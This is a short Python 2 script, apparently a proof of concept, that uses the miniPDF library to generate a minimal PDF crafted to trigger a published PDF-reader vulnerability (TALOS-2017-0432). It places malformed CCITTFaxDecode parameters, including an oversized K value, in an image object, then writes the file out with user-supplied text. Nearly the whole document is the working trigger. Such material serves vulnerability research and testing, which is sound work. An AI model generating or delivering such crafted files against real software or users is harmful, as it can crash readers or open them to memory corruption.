#! /usr/bin/env python
#More info at http://github.com/feliam/miniPDF
'''
Make a minimal PDF triggering https://www.talosintelligence.com/reports/TALOS-2017-0432
'''
import sys, StringIO
from minipdf import PDFDoc, PDFName, PDFNum, PDFString, PDFRef, PDFStream, PDFDict, PDFArray, PDFBool

import optparse
parser = optparse.OptionParser(usage="%prog [options] [TEXT]", description=__doc__)
parser.add_option("-i", "--input", metavar="IFILE", help="read text from IFILE (otherwise stdin)")
parser.add_option("-o", "--output", metavar="OFILE", help="write output to OFILE (otherwise stdout)")
(options, args) = parser.parse_args()

if options.input:
    file_input = file(options.input)
elif len(args) > 0:
    file_input = StringIO.StringIO(" ".join(args))
else:
    file_input = sys.stdin


if not options.output is None:
    file_output = file(options.output, "w")
else:
    file_output = sys.stdout


#The document
doc = PDFDoc()

_width = 10
_height = 10
decodeparams = PDFDict()
decodeparams['Columns'] = PDFNum(2)
decodeparams['Colors'] = PDFNum(1)
decodeparams['BitsPerComponent'] = PDFNum(16)
decodeparams['Predictor'] = PDFNum(2)

decodeparams['K'] = PDFNum(0x3fffffff-4)
decodeparams['Rows'] = PDFNum(0)
decodeparams['EndOfLine'] = PDFBool(False)
decodeparams['EncodedByteAlign'] = PDFBool(False)
decodeparams['EndOfBlock'] = PDFBool(True)
decodeparams['BlackIs1'] = PDFBool(False)


xobj = PDFStream("z"*100 )#file(sys.argv[1]).read())
xobj['Type'] = PDFName('XObject')
xobj['Subtype'] = PDFName('Image')
xobj['Width'] = PDFNum(_width)
xobj['Height'] = PDFNum(_height)
xobj['ColorSpace'] = PDFName('DeviceRGB')
xobj['BitsPerComponent'] = PDFNum(1)
xobj['Filter'] = PDFName('CCITTFaxDecode')
xobj['W'] = PDFArray( [PDFNum(0),PDFNum(0),PDFNum(0)] )
xobj['DecodeParms'] = decodeparams


#font
font = PDFDict()
font['Name'] = PDFName('F1')
font['Subtype'] = PDFName('Type1')
font['BaseFont'] = PDFName('Helvetica')

#name:font map
fontname = PDFDict()
fontname['F1'] = font

#resources
resources = PDFDict()
resources['Font'] = fontname
doc += resources

#contents
contents = PDFStream('''BT 
/F1 24 Tf 0 700 Td 
%s Tj 
ET
'''%PDFString(file_input.read()))
doc += contents

#page
page = PDFDict()
page['Type'] = PDFName('Page')
page['MediaBox'] = PDFArray([0, 0, 612, 792])
page['Contents'] = PDFRef(contents)
page['Resources'] = PDFRef(resources)
doc += page

#pages
pages = PDFDict()
pages['Type'] = PDFName('Pages')
pages['Kids'] = PDFArray([PDFRef(page)])
pages['Count'] = PDFNum(1)
doc += pages

#add parent reference in page
page['Parent'] = PDFRef(pages)

#catalog
catalog = PDFDict()
catalog['Type'] = PDFName('Catalog')
catalog['Pages'] = PDFRef(pages)
doc += catalog

doc.setRoot(catalog)

file_output.write(str(doc))

#@feliam
